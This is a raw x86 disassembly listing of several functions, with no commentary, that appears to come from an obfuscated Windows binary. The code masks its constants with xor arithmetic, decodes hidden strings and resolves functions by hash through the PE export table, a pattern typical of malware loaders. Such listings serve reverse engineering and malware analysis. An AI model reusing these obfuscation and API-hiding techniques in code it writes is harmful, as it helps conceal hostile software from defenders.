  418fb0:	push   esi
  418fb1:	mov    esi,eax
  418fb3:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  418fba:	mov    edx,DWORD PTR [ebp-0x4]
  418fbd:	mov    eax,0x751089b
  418fc2:	xor    edx,eax
  418fc4:	mov    ecx,0x3272e2
  418fc9:	add    edx,ecx
  418fcb:	cmp    esi,edx
  418fcd:	je     0x41900f
  418fcf:	push   ebx
  418fd0:	push   edi
  418fd1:	mov    edx,DWORD PTR [ebp-0x8]
  418fd4:	mov    ebx,DWORD PTR [ebp+0x8]
  418fd7:	xor    edx,eax
  418fd9:	mov    edi,0xffcd8d1e
  418fde:	sub    edi,edx
  418fe0:	add    esi,edi
  418fe2:	lea    edx,[esi-0x3272e2]
  418fe8:	xor    edx,eax
  418fea:	mov    DWORD PTR [ebp-0xc],edx
  418fed:	mov    edx,DWORD PTR [ebp-0x4]
  418ff0:	mov    edi,DWORD PTR [ebp-0xc]
  418ff3:	xor    dl,0x9b
  418ff6:	sub    dl,0x1e
  418ff9:	xor    edi,eax
  418ffb:	mov    BYTE PTR [edi+ebx*1+0x3272e2],dl
  419002:	mov    edx,DWORD PTR [ebp-0x4]
  419005:	xor    edx,eax
  419007:	add    edx,ecx
  419009:	cmp    esi,edx
  41900b:	jne    0x418fd1
  41900d:	pop    edi
  41900e:	pop    ebx
  41900f:	pop    esi
  419010:	leave  
  419011:	ret    0x4
  419014:	push   ebp
  419015:	mov    ebp,esp
  419017:	sub    esp,0x21c
  41901d:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  419024:	mov    DWORD PTR [ebp-0x14],0xf89c8584
  41902b:	mov    eax,DWORD PTR [ebp+0x10]
  41902e:	mov    eax,DWORD PTR [ebp-0x4]
  419031:	mov    ecx,DWORD PTR [ebp+0x8]
  419034:	push   esi
  419035:	push   edi
  419036:	mov    edi,0x751089b
  41903b:	xor    eax,edi
  41903d:	mov    esi,0x3272e2
  419042:	add    eax,esi
  419044:	cmp    eax,ecx
  419046:	mov    eax,DWORD PTR [ebp-0x4]
  419049:	jne    0x419054
  41904b:	xor    eax,edi
  41904d:	add    eax,esi
  41904f:	jmp    0x419100
  419054:	mov    ecx,DWORD PTR [ebp+0xc]
  419057:	xor    eax,edi
  419059:	add    eax,esi
  41905b:	cmp    eax,ecx
  41905d:	jne    0x419064
  41905f:	mov    eax,DWORD PTR [ebp-0x4]
  419062:	jmp    0x41904b
  419064:	lea    eax,[ebp-0x21c]
  41906a:	mov    DWORD PTR [ebp-0x8],eax
  41906d:	mov    eax,DWORD PTR [ebp+0xc]
  419070:	mov    DWORD PTR [ebp-0x10],eax
  419073:	mov    eax,DWORD PTR [ebp-0x4]
  419076:	xor    eax,edi
  419078:	add    eax,esi
  41907a:	mov    DWORD PTR [ebp+0x10],eax
  41907d:	mov    eax,DWORD PTR [ebp+0xc]
  419080:	push   ebx
  419081:	call   0x418d5c
  419086:	mov    ebx,eax
  419088:	mov    eax,DWORD PTR [ebp+0x8]
  41908b:	mov    eax,DWORD PTR [eax+0x14]
  41908e:	jmp    0x4190e8
  419090:	mov    eax,DWORD PTR [ebp+0xc]
  419093:	sub    eax,0x8
  419096:	mov    DWORD PTR [ebp-0xc],eax
  419099:	mov    eax,DWORD PTR [ebp-0xc]
  41909c:	mov    eax,DWORD PTR [eax+0x28]
  41909f:	call   0x418c44
  4190a4:	mov    DWORD PTR [ebp+0x10],eax
  4190a7:	push   DWORD PTR [ebp+0x10]
  4190aa:	mov    edx,DWORD PTR [ebp-0x8]
  4190ad:	call   0x418deb
  4190b2:	mov    eax,DWORD PTR [ebp-0x4]
  4190b5:	xor    eax,edi
  4190b7:	add    eax,esi
  4190b9:	cmp    eax,ebx
  4190bb:	jne    0x4190c5
  4190bd:	mov    eax,DWORD PTR [ebp-0x8]
  4190c0:	call   0x418cd2
  4190c5:	mov    eax,DWORD PTR [ebp-0x14]
  4190c8:	xor    eax,edi
  4190ca:	add    eax,esi
  4190cc:	push   eax
  4190cd:	push   DWORD PTR [ebp-0x10]
  4190d0:	mov    eax,DWORD PTR [ebp-0x8]
  4190d3:	call   0x4189fe
  4190d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4190db:	xor    ecx,edi
  4190dd:	add    ecx,esi
  4190df:	cmp    eax,ecx
  4190e1:	je     0x419106
  4190e3:	mov    eax,DWORD PTR [ebp+0xc]
  4190e6:	mov    eax,DWORD PTR [eax]
  4190e8:	mov    DWORD PTR [ebp+0xc],eax
  4190eb:	mov    eax,DWORD PTR [ebp+0x8]
  4190ee:	mov    ecx,DWORD PTR [ebp+0xc]
  4190f1:	add    eax,0x14
  4190f4:	cmp    ecx,eax
  4190f6:	jne    0x419090
  4190f8:	mov    eax,DWORD PTR [ebp-0x4]
  4190fb:	xor    eax,edi
  4190fd:	add    eax,esi
  4190ff:	pop    ebx
  419100:	pop    edi
  419101:	pop    esi
  419102:	leave  
  419103:	ret    0xc
  419106:	mov    eax,DWORD PTR [ebp-0xc]
  419109:	mov    eax,DWORD PTR [eax+0x18]
  41910c:	jmp    0x4190ff
  41910e:	push   ebp
  41910f:	mov    ebp,esp
  419111:	mov    eax,DWORD PTR [ebp+0xc]
  419114:	sub    esp,0x10
  419117:	cmp    DWORD PTR [ebp+0x8],0x0
  41911b:	push   ebx
  41911c:	push   esi
  41911d:	push   edi
  41911e:	je     0x4191d3
  419124:	test   eax,eax
  419126:	je     0x4191d3
  41912c:	movzx  eax,WORD PTR [eax+0x20]
  419130:	mov    ecx,eax
  419132:	mov    DWORD PTR [ebp-0x10],eax
  419135:	xor    edx,edx
  419137:	and    DWORD PTR [ebp-0x8],edx
  41913a:	mov    eax,0x8a8d
  41913f:	xor    ecx,eax
  419141:	add    ecx,0x3b51
  419147:	mov    DWORD PTR [ebp-0xc],ecx
  41914a:	and    DWORD PTR [ebp-0x4],0x0
  41914e:	xor    ecx,ecx
  419150:	push   0x7e
  419152:	pop    edi
  419153:	cmp    cx,WORD PTR [ebp-0xc]
  419157:	jae    0x4191bd
  419159:	lea    esi,[edx-0x3b51]
  41915f:	xor    esi,eax
  419161:	movzx  ecx,WORD PTR [ebp-0x4]
  419165:	mov    ebx,DWORD PTR [ebp+0xc]
  419168:	lea    ecx,[ebx+ecx*4]
  41916b:	cmp    WORD PTR [ecx+0x2],si
  41916f:	jne    0x4191a8
  419171:	movzx  ecx,WORD PTR [ecx]
  419174:	mov    edi,0x4e22
  419179:	cmp    cx,di
  41917c:	jne    0x41918a
  41917e:	mov    ebx,DWORD PTR [ebp+0x8]
  419181:	movzx  edi,dx
  419184:	cmp    BYTE PTR [edi+ebx*1],0x0
  419188:	je     0x4191b7
  41918a:	mov    ebx,DWORD PTR [ebp+0x8]
  41918d:	movzx  edi,dx
  419190:	movsx  di,BYTE PTR [edi+ebx*1]
  419195:	mov    ebx,0x3b51
  41919a:	sub    di,bx
  41919d:	xor    di,ax
  4191a0:	cmp    cx,di
  4191a3:	je     0x4191b7
  4191a5:	push   0x7c
  4191a7:	pop    edi
  4191a8:	inc    DWORD PTR [ebp-0x4]
  4191ab:	mov    cx,WORD PTR [ebp-0xc]
  4191af:	cmp    WORD PTR [ebp-0x4],cx
  4191b3:	jb     0x419161
  4191b5:	jmp    0x4191bd
  4191b7:	inc    DWORD PTR [ebp-0x8]
  4191ba:	push   0x7d
  4191bc:	pop    edi
  4191bd:	mov    esi,DWORD PTR [ebp+0x8]
  4191c0:	movzx  ecx,dx
  4191c3:	cmp    BYTE PTR [ecx+esi*1],0x0
  4191c7:	je     0x4191dc
  4191c9:	inc    edx
  4191ca:	cmp    edi,0x7c
  4191cd:	jne    0x41914a
  4191d3:	xor    eax,eax
  4191d5:	pop    edi
  4191d6:	pop    esi
  4191d7:	pop    ebx
  4191d8:	leave  
  4191d9:	ret    0x8
  4191dc:	mov    ecx,DWORD PTR [ebp-0x8]
  4191df:	add    ecx,0xffffc4af
  4191e5:	xor    cx,ax
  4191e8:	xor    eax,eax
  4191ea:	cmp    cx,WORD PTR [ebp-0x10]
  4191ee:	sete   al
  4191f1:	jmp    0x4191d5
  4191f3:	push   ebp
  4191f4:	mov    ebp,esp
  4191f6:	sub    esp,0x50
  4191f9:	push   edi
  4191fa:	mov    edi,eax
  4191fc:	mov    eax,DWORD PTR [edi+0x1a8]
  419202:	cmp    DWORD PTR [eax],0x0
  419205:	jne    0x41920e
  419207:	xor    eax,eax
  419209:	jmp    0x41933f
  41920e:	push   DWORD PTR [ebp+0x8]
  419211:	push   0x2c
  419213:	pop    eax
  419214:	call   0x418fa3
  419219:	mov    edx,DWORD PTR [edi+0x1ac]
  41921f:	lea    eax,[edi+0x22]
  419222:	mov    DWORD PTR [ebp-0x4c],eax
  419225:	lea    eax,[edi+0x44]
  419228:	mov    DWORD PTR [ebp-0x48],eax
  41922b:	lea    eax,[edi+0x66]
  41922e:	mov    DWORD PTR [ebp-0x44],eax
  419231:	lea    eax,[edi+0x88]
  419237:	mov    DWORD PTR [ebp-0x40],eax
  41923a:	lea    eax,[edi+0xaa]
  419240:	mov    DWORD PTR [ebp-0x3c],eax
  419243:	lea    eax,[edi+0xcc]
  419249:	mov    DWORD PTR [ebp-0x38],eax
  41924c:	lea    eax,[edi+0xee]
  419252:	mov    DWORD PTR [ebp-0x34],eax
  419255:	lea    eax,[edi+0x110]
  41925b:	mov    DWORD PTR [ebp-0x30],eax
  41925e:	lea    eax,[edi+0x132]
  419264:	mov    DWORD PTR [ebp-0x2c],eax
  419267:	lea    eax,[edi+0x154]
  41926d:	push   edi
  41926e:	mov    DWORD PTR [ebp-0x50],edi
  419271:	mov    DWORD PTR [ebp-0x28],eax
  419274:	call   0x419373
  419279:	push   eax
  41927a:	mov    eax,DWORD PTR [edi+0x1a8]
  419280:	push   DWORD PTR [eax]
  419282:	call   0x419014
  419287:	mov    DWORD PTR [ebp-0x10],eax
  41928a:	test   eax,eax
  41928c:	je     0x41933f
  419292:	mov    ecx,DWORD PTR [eax+0x3c]
  419295:	push   ebx
  419296:	push   esi
  419297:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41929b:	add    esi,eax
  41929d:	mov    edi,DWORD PTR [esi+0x24]
  4192a0:	mov    ecx,DWORD PTR [esi+0x1c]
  4192a3:	mov    edx,DWORD PTR [esi+0x20]
  4192a6:	mov    ebx,DWORD PTR [esi+0x18]
  4192a9:	add    edi,eax
  4192ab:	mov    DWORD PTR [ebp-0x20],edi
  4192ae:	mov    edi,DWORD PTR [esi+0x14]
  4192b1:	add    ecx,eax
  4192b3:	add    edx,eax
  4192b5:	mov    DWORD PTR [ebp-0xc],ecx
  4192b8:	mov    DWORD PTR [ebp-0x1c],edx
  4192bb:	mov    DWORD PTR [ebp-0x8],edi
  4192be:	cmp    edi,ebx
  4192c0:	ja     0x4192c5
  4192c2:	mov    DWORD PTR [ebp-0x8],ebx
  4192c5:	xor    ebx,ebx
  4192c7:	mov    DWORD PTR [ebp-0x18],ebx
  4192ca:	cmp    DWORD PTR [ebp-0x8],ebx
  4192cd:	jbe    0x41933d
  4192cf:	jmp    0x4192d4
  4192d1:	mov    edx,DWORD PTR [ebp-0x1c]
  4192d4:	mov    edi,DWORD PTR [ebp-0x20]
  4192d7:	movzx  edi,WORD PTR [edi+ebx*2]
  4192db:	cmp    ebx,DWORD PTR [esi+0x18]
  4192de:	jae    0x41933d
  4192e0:	cmp    edi,DWORD PTR [esi+0x14]
  4192e3:	jae    0x41933d
  4192e5:	mov    ebx,DWORD PTR [edx+ebx*4]
  4192e8:	mov    edx,DWORD PTR [ebp+0x8]
  4192eb:	mov    edi,DWORD PTR [ecx+edi*4]
  4192ee:	mov    DWORD PTR [ebp-0x4],edx
  4192f1:	lea    edx,[ebp-0x50]
  4192f4:	add    ebx,eax
  4192f6:	add    edi,eax
  4192f8:	sub    edx,DWORD PTR [ebp+0x8]
  4192fb:	mov    DWORD PTR [ebp-0x14],0xb
  419302:	mov    DWORD PTR [ebp-0x24],edx
  419305:	mov    edx,DWORD PTR [ebp-0x4]
  419308:	cmp    DWORD PTR [edx],0x0
  41930b:	jne    0x419328
  41930d:	mov    eax,DWORD PTR [ebp-0x24]
  419310:	push   DWORD PTR [eax+edx*1]
  419313:	push   ebx
  419314:	call   0x41910e
  419319:	mov    ecx,DWORD PTR [ebp-0xc]
  41931c:	test   eax,eax
  41931e:	je     0x419325
  419320:	mov    eax,DWORD PTR [ebp-0x4]
  419323:	mov    DWORD PTR [eax],edi
  419325:	mov    eax,DWORD PTR [ebp-0x10]
  419328:	add    DWORD PTR [ebp-0x4],0x4
  41932c:	dec    DWORD PTR [ebp-0x14]
  41932f:	jne    0x419305
  419331:	mov    ebx,DWORD PTR [ebp-0x18]
  419334:	inc    ebx
  419335:	mov    DWORD PTR [ebp-0x18],ebx
  419338:	cmp    ebx,DWORD PTR [ebp-0x8]
  41933b:	jb     0x4192d1
  41933d:	pop    esi
  41933e:	pop    ebx
  41933f:	pop    edi
  419340:	leave  
  419341:	ret    0x4
  419344:	push   ebp
  419345:	mov    ebp,esp
  419347:	mov    eax,DWORD PTR [ebp+0x8]
  41934a:	push   esi
  41934b:	push   DWORD PTR [eax+0x1d8]
  419351:	lea    esi,[eax+0x198]
  419357:	mov    eax,DWORD PTR [ebp+0x8]
  41935a:	call   0x4191f3
  41935f:	mov    ecx,DWORD PTR [esi]
  419361:	mov    DWORD PTR [ecx],eax
  419363:	mov    eax,DWORD PTR [esi]
  419365:	xor    ecx,ecx
  419367:	cmp    DWORD PTR [eax],ecx
  419369:	pop    esi
  41936a:	setne  cl
  41936d:	mov    eax,ecx
  41936f:	pop    ebp
  419370:	ret    0x4
  419373:	mov    ecx,DWORD PTR [edi+0x188]
  419379:	push   ebx
  41937a:	jmp    0x41938f
  41937c:	xor    eax,0x8a8d
  419381:	add    eax,0x3b51
  419386:	mov    WORD PTR [ecx],ax
  419389:	add    ecx,0x2
  41938c:	add    edx,0x2
  41938f:	movzx  eax,WORD PTR [edx]
  419392:	mov    ebx,0x4e22
  419397:	cmp    ax,bx
  41939a:	jne    0x41937c
  41939c:	xor    eax,eax
  41939e:	mov    WORD PTR [ecx],ax
  4193a1:	mov    eax,DWORD PTR [edi+0x188]
  4193a7:	pop    ebx
  4193a8:	ret    
  4193a9:	push   edi
  4193aa:	mov    edi,eax
  4193ac:	mov    eax,DWORD PTR [esi+0x188]
  4193b2:	shl    edi,0x6
  4193b5:	add    eax,edi
  4193b7:	jmp    0x4193c3
  4193b9:	xor    cl,0x74
  4193bc:	sub    cl,0x8
  4193bf:	mov    BYTE PTR [eax],cl
  4193c1:	inc    eax
  4193c2:	inc    edx
  4193c3:	mov    cl,BYTE PTR [edx]
  4193c5:	cmp    cl,0x7c
  4193c8:	jne    0x4193b9
  4193ca:	mov    BYTE PTR [eax],0x0
  4193cd:	mov    eax,DWORD PTR [esi+0x188]
  4193d3:	add    eax,edi
  4193d5:	pop    edi
  4193d6:	ret    
  4193d7:	push   ebp
  4193d8:	mov    ebp,esp
  4193da:	sub    esp,0x38
  4193dd:	push   ebx
  4193de:	mov    ebx,0xf89c8585
  4193e3:	mov    DWORD PTR [ebp-0x4],ebx
  4193e6:	lea    eax,[ebx-0x1]
  4193e9:	push   esi
  4193ea:	mov    DWORD PTR [ebp-0x24],eax
  4193ed:	mov    ecx,DWORD PTR [ebp-0x4]
  4193f0:	mov    edx,DWORD PTR [ebp+0x8]
  4193f3:	mov    esi,0x751089b
  4193f8:	push   edi
  4193f9:	xor    ecx,esi
  4193fb:	mov    edi,0x3272e2
  419400:	add    ecx,edi
  419402:	cmp    edx,ecx
  419404:	je     0x419572
  41940a:	mov    ecx,DWORD PTR [ebp-0x4]
  41940d:	mov    edx,DWORD PTR [ebp+0xc]
  419410:	xor    ecx,esi
  419412:	add    ecx,edi
  419414:	cmp    edx,ecx
  419416:	je     0x419572
  41941c:	mov    ecx,DWORD PTR [ebp+0x10]
  41941f:	mov    DWORD PTR [ebp-0x18],ecx
  419422:	mov    ecx,DWORD PTR [ebp+0xc]
  419425:	mov    DWORD PTR [ebp-0x14],ecx
  419428:	mov    ecx,DWORD PTR [ebp+0x8]
  41942b:	mov    DWORD PTR [ebp-0x1c],0xf89c8507
  419432:	mov    DWORD PTR [ebp-0x20],eax
  419435:	mov    DWORD PTR [ebp-0x10],ebx
  419438:	mov    DWORD PTR [ebp+0xc],eax
  41943b:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  419442:	mov    eax,DWORD PTR [ebp+0xc]
  419445:	mov    DWORD PTR [ebp-0xc],ecx
  419448:	xor    eax,esi
  41944a:	mov    ecx,0xffcd8d1e
  41944f:	sub    ecx,eax
  419451:	add    ecx,DWORD PTR [ebp-0x14]
  419454:	mov    DWORD PTR [ebp+0x8],ecx
  419457:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41945e:	jmp    0x419562
  419463:	mov    eax,DWORD PTR [ebp+0xc]
  419466:	mov    ecx,DWORD PTR [ebp+0xc]
  419469:	xor    eax,esi
  41946b:	xor    ecx,esi
  41946d:	lea    ecx,[eax+ecx*1+0x64e5c4]
  419474:	mov    eax,DWORD PTR [ebp+0x8]
  419477:	xor    edx,edx
  419479:	div    ecx
  41947b:	mov    eax,DWORD PTR [ebp+0x10]
  41947e:	mov    ecx,DWORD PTR [ebp+0xc]
  419481:	xor    eax,esi
  419483:	xor    ecx,esi
  419485:	sub    eax,ecx
  419487:	cmp    edx,eax
  419489:	jne    0x41951e
  41948f:	mov    eax,DWORD PTR [ebp+0x8]
  419492:	add    eax,DWORD PTR [ebp-0xc]
  419495:	mov    dl,BYTE PTR [eax]
  419497:	mov    eax,DWORD PTR [ebp-0x10]
  41949a:	mov    ecx,DWORD PTR [ebp-0x8]
  41949d:	xor    eax,esi
  41949f:	xor    ecx,esi
  4194a1:	add    eax,edi
  4194a3:	add    ecx,edi
  4194a5:	cmp    eax,ecx
  4194a7:	jae    0x4194ef
  4194a9:	lea    ecx,[eax-0x3272e2]
  4194af:	mov    DWORD PTR [ebp-0x4],ecx
  4194b2:	mov    ebx,DWORD PTR [ebp-0x4]
  4194b5:	xor    ebx,esi
  4194b7:	add    ebx,0x7f55d8fb
  4194bd:	lea    ecx,[ebp+eax*4-0x38]
  4194c1:	mov    DWORD PTR [ecx],ebx
  4194c3:	mov    ebx,DWORD PTR [ecx]
  4194c5:	cmp    ebx,0x244ecbda
  4194cb:	jbe    0x4194d5
  4194cd:	add    DWORD PTR [ecx],0x405fc19
  4194d3:	jmp    0x4194db
  4194d5:	add    DWORD PTR [ecx],0xfdaf43e7
  4194db:	mov    ecx,DWORD PTR [ebp-0x8]
  4194de:	xor    ecx,esi
  4194e0:	inc    eax
  4194e1:	inc    DWORD PTR [ebp-0x4]
  4194e4:	add    ecx,edi
  4194e6:	cmp    eax,ecx
  4194e8:	jb     0x4194b2
  4194ea:	mov    ebx,0xf89c8585
  4194ef:	mov    eax,DWORD PTR [ebp-0x18]
  4194f2:	test   eax,eax
  4194f4:	jne    0x4194fe
  4194f6:	xor    dl,0x74
  4194f9:	sub    dl,0x8
  4194fc:	jmp    0x419514
  4194fe:	mov    eax,DWORD PTR [ebp-0x1c]
  419501:	xor    al,0x9b
  419503:	mov    cl,0x1e
  419505:	sub    cl,al
  419507:	add    dl,cl
  419509:	mov    ecx,DWORD PTR [ebp-0x20]
  41950c:	xor    cl,0x9b
  41950f:	sub    cl,0x1e
  419512:	ror    dl,cl
  419514:	xor    eax,eax
  419516:	mov    eax,DWORD PTR [ebp+0x8]
  419519:	add    eax,DWORD PTR [ebp-0xc]
  41951c:	mov    BYTE PTR [eax],dl
  41951e:	mov    eax,DWORD PTR [ebp+0x8]
  419521:	mov    ecx,DWORD PTR [ebp-0x10]
  419524:	sub    eax,edi
  419526:	xor    eax,esi
  419528:	cmp    eax,ecx
  41952a:	jne    0x419550
  41952c:	mov    eax,DWORD PTR [ebp+0x10]
  41952f:	mov    ecx,DWORD PTR [ebp+0xc]
  419532:	xor    eax,esi
  419534:	xor    ecx,esi
  419536:	sub    eax,ecx
  419538:	sub    eax,edi
  41953a:	xor    eax,esi
  41953c:	mov    DWORD PTR [ebp+0x10],eax
  41953f:	mov    eax,DWORD PTR [ebp+0xc]
  419542:	xor    eax,esi
  419544:	mov    ecx,0xffcd8d1e
  419549:	sub    ecx,eax
  41954b:	add    ecx,DWORD PTR [ebp-0x14]
  41954e:	jmp    0x41955f
  419550:	mov    eax,DWORD PTR [ebp+0xc]
  419553:	xor    eax,esi
  419555:	mov    ecx,0xffcd8d1e
  41955a:	sub    ecx,eax
  41955c:	add    ecx,DWORD PTR [ebp+0x8]
  41955f:	mov    DWORD PTR [ebp+0x8],ecx
  419562:	mov    eax,DWORD PTR [ebp+0x10]
  419565:	cmp    eax,ebx
  419567:	jne    0x419463
  41956d:	mov    eax,DWORD PTR [ebp-0x24]
  419570:	jmp    0x419575
  419572:	mov    eax,DWORD PTR [ebp-0x4]
  419575:	xor    eax,esi
  419577:	add    eax,edi
  419579:	pop    edi
  41957a:	pop    esi
  41957b:	pop    ebx
  41957c:	leave  
  41957d:	ret    0xc
  419580:	push   ebp
  419581:	mov    ebp,esp
  419583:	sub    esp,0x14
  419586:	mov    DWORD PTR [ebp-0x10],0xf89c8585
  41958d:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  419594:	mov    eax,DWORD PTR [ebx]
  419596:	mov    DWORD PTR [ebp-0x8],eax
  419599:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4195a0:	push   esi
  4195a1:	push   edi
  4195a2:	mov    DWORD PTR [ebp-0x14],0xead718a5
  4195a9:	mov    edi,DWORD PTR [ebp-0x4]
  4195ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4195af:	mov    eax,0x751089b
  4195b4:	xor    edi,eax
  4195b6:	mov    edx,0x3272e2
  4195bb:	xor    ecx,eax
  4195bd:	add    edi,edx
  4195bf:	add    ecx,edx
  4195c1:	imul   edi,ecx
  4195c4:	jmp    0x41960c
  4195c6:	mov    ecx,DWORD PTR [ebp-0x8]
  4195c9:	mov    esi,DWORD PTR [ebp-0x4]
  4195cc:	xor    ecx,eax
  4195ce:	xor    esi,eax
  4195d0:	add    ecx,edx
  4195d2:	add    esi,edx
  4195d4:	test   esi,ecx
  4195d6:	mov    esi,DWORD PTR [ebp-0x8]
  4195d9:	mov    ecx,DWORD PTR [ebp-0x4]
  4195dc:	je     0x4195f3
  4195de:	xor    ecx,eax
  4195e0:	xor    esi,eax
  4195e2:	add    ecx,edx
  4195e4:	add    esi,edx
  4195e6:	shr    esi,cl
  4195e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4195eb:	xor    ecx,eax
  4195ed:	add    ecx,edx
  4195ef:	xor    esi,ecx
  4195f1:	jmp    0x4195fd
  4195f3:	xor    esi,eax
  4195f5:	xor    ecx,eax
  4195f7:	add    esi,edx
  4195f9:	add    ecx,edx
  4195fb:	shr    esi,cl
  4195fd:	mov    DWORD PTR [ebp-0x8],esi
  419600:	mov    ecx,DWORD PTR [ebp-0x4]
  419603:	xor    ecx,eax
  419605:	lea    edi,[edi+ecx*1+0x3272e2]
  41960c:	mov    ecx,DWORD PTR [ebp-0xc]
  41960f:	mov    esi,DWORD PTR [ebp-0x4]
  419612:	xor    esi,eax
  419614:	xor    ecx,eax
  419616:	sub    ecx,esi
  419618:	cmp    edi,ecx
  41961a:	jbe    0x4195c6
  41961c:	mov    eax,DWORD PTR [ebp-0x8]
  41961f:	pop    edi
  419620:	mov    DWORD PTR [ebx],eax
  419622:	mov    eax,DWORD PTR [ebp-0x8]
  419625:	pop    esi
  419626:	leave  
  419627:	ret    
  419628:	push   ebp
  419629:	mov    ebp,esp
  41962b:	sub    esp,0x420
  419631:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  419638:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  41963f:	mov    DWORD PTR [ebp-0x18],0xf89c8685
  419646:	push   ebx
  419647:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41964e:	mov    eax,DWORD PTR [ebp-0x14]
  419651:	push   esi
  419652:	mov    esi,0x751089b
  419657:	push   edi
  419658:	xor    eax,esi
  41965a:	mov    edi,0x3272e2
  41965f:	add    eax,edi
  419661:	mov    DWORD PTR [ebp-0x8],eax
  419664:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41966b:	mov    DWORD PTR [ebp-0x4],0xead718a5
  419672:	mov    DWORD PTR [ebp-0x10],0x8
  419679:	mov    ecx,ecx
  41967b:	mov    eax,DWORD PTR [ebp-0xc]
  41967e:	mov    ecx,DWORD PTR [ebp-0x14]
  419681:	xor    eax,esi
  419683:	xor    ecx,esi
  419685:	add    eax,edi
  419687:	add    ecx,edi
  419689:	imul   eax,ecx
  41968c:	jmp    0x4196bf
  41968e:	mov    eax,DWORD PTR [ebp-0x4]
  419691:	sub    eax,edi
  419693:	xor    eax,esi
  419695:	mov    DWORD PTR [ebp-0x8],eax
  419698:	lea    ebx,[ebp-0x8]
  41969b:	call   0x419580
  4196a0:	mov    DWORD PTR [ebp-0x8],eax
  4196a3:	mov    eax,DWORD PTR [ebp-0x8]
  4196a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4196a9:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4196b0:	mov    eax,DWORD PTR [ebp-0xc]
  4196b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4196b6:	xor    eax,esi
  4196b8:	lea    eax,[eax+ecx*1+0x3272e2]
  4196bf:	mov    DWORD PTR [ebp-0x4],eax
  4196c2:	mov    eax,DWORD PTR [ebp-0x18]
  4196c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4196c8:	xor    ecx,esi
  4196ca:	xor    eax,esi
  4196cc:	sub    eax,ecx
  4196ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4196d1:	cmp    ecx,eax
  4196d3:	jbe    0x41968e
  4196d5:	mov    eax,DWORD PTR [ebp-0x1c]
  4196d8:	xor    eax,esi
  4196da:	add    eax,edi
  4196dc:	mov    DWORD PTR [ebp-0x8],eax
  4196df:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  4196e6:	mov    ebx,ebx
  4196e8:	jmp    0x41974b
  4196ea:	mov    ecx,DWORD PTR [ebp-0x20]
  4196ed:	mov    eax,DWORD PTR [ebp-0x8]
  4196f0:	xor    ecx,esi
  4196f2:	add    ecx,edi
  4196f4:	shr    eax,cl
  4196f6:	mov    DWORD PTR [ebp-0x4],eax
  4196f9:	mov    eax,DWORD PTR [ebp+0x8]
  4196fc:	mov    cl,BYTE PTR [eax]
  4196fe:	mov    BYTE PTR [ebp+0xb],cl
  419701:	mov    cl,BYTE PTR [ebp+0xb]
  419704:	mov    edx,DWORD PTR [ebp-0x8]
  419707:	movzx  ecx,cl
  41970a:	xor    ecx,edx
  41970c:	mov    DWORD PTR [ebp+0x8],ecx
  41970f:	mov    ecx,DWORD PTR [ebp-0x18]
  419712:	mov    edx,DWORD PTR [ebp+0x8]
  419715:	xor    ecx,esi
  419717:	add    ecx,edi
  419719:	and    ecx,edx
  41971b:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  419722:	mov    edx,DWORD PTR [ebp-0x4]
  419725:	xor    ecx,edx
  419727:	mov    DWORD PTR [ebp-0x8],ecx
  41972a:	mov    ecx,DWORD PTR [ebp-0xc]
  41972d:	xor    ecx,esi
  41972f:	lea    eax,[eax+ecx*1+0x3272e2]
  419736:	mov    DWORD PTR [ebp+0x8],eax
  419739:	mov    eax,DWORD PTR [ebp-0xc]
  41973c:	xor    eax,esi
  41973e:	mov    ecx,0xffcd8d1e
  419743:	sub    ecx,eax
  419745:	add    ecx,DWORD PTR [ebp-0x10]
  419748:	mov    DWORD PTR [ebp-0x10],ecx
  41974b:	mov    eax,DWORD PTR [ebp-0x14]
  41974e:	mov    ecx,DWORD PTR [ebp-0x10]
  419751:	xor    eax,esi
  419753:	add    eax,edi
  419755:	cmp    ecx,eax
  419757:	jne    0x4196ea
  419759:	mov    eax,DWORD PTR [ebp-0x1c]
  41975c:	mov    ecx,DWORD PTR [ebp-0x8]
  41975f:	xor    eax,esi
  419761:	add    eax,edi
  419763:	pop    edi
  419764:	pop    esi
  419765:	xor    eax,ecx
  419767:	pop    ebx
  419768:	leave  
  419769:	ret    0x4
  41976c:	push   ebp
  41976d:	mov    ebp,esp
  41976f:	mov    eax,DWORD PTR [ebp+0x1c]
  419772:	mov    ecx,DWORD PTR [ebp+0x8]
  419775:	mov    edx,DWORD PTR [ebp+0x10]
  419778:	mov    eax,DWORD PTR [eax+0x190]
  41977e:	mov    eax,DWORD PTR [eax]
  419780:	sub    esp,0x64
  419783:	push   ebx
  419784:	push   esi
  419785:	push   edi
  419786:	mov    edi,0x751089b
  41978b:	xor    ecx,edi
  41978d:	mov    ebx,0x3272e2
  419792:	add    ecx,ebx
  419794:	cmp    ecx,edx
  419796:	jne    0x4197a7
  419798:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  4197a2:	jmp    0x419ca3
  4197a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4197aa:	mov    esi,DWORD PTR [ebp+0x14]
  4197ad:	mov    edx,DWORD PTR [esi]
  4197af:	xor    ecx,edi
  4197b1:	add    ecx,ebx
  4197b3:	cmp    edx,ecx
  4197b5:	je     0x419c5e
  4197bb:	mov    ecx,DWORD PTR [ebp+0x1c]
  4197be:	mov    DWORD PTR [ebp-0x1c],eax
  4197c1:	mov    DWORD PTR [ebp+0x1c],ecx
  4197c4:	mov    ecx,DWORD PTR [ebp+0x18]
  4197c7:	mov    eax,DWORD PTR [esi]
  4197c9:	mov    DWORD PTR [ebp-0x20],eax
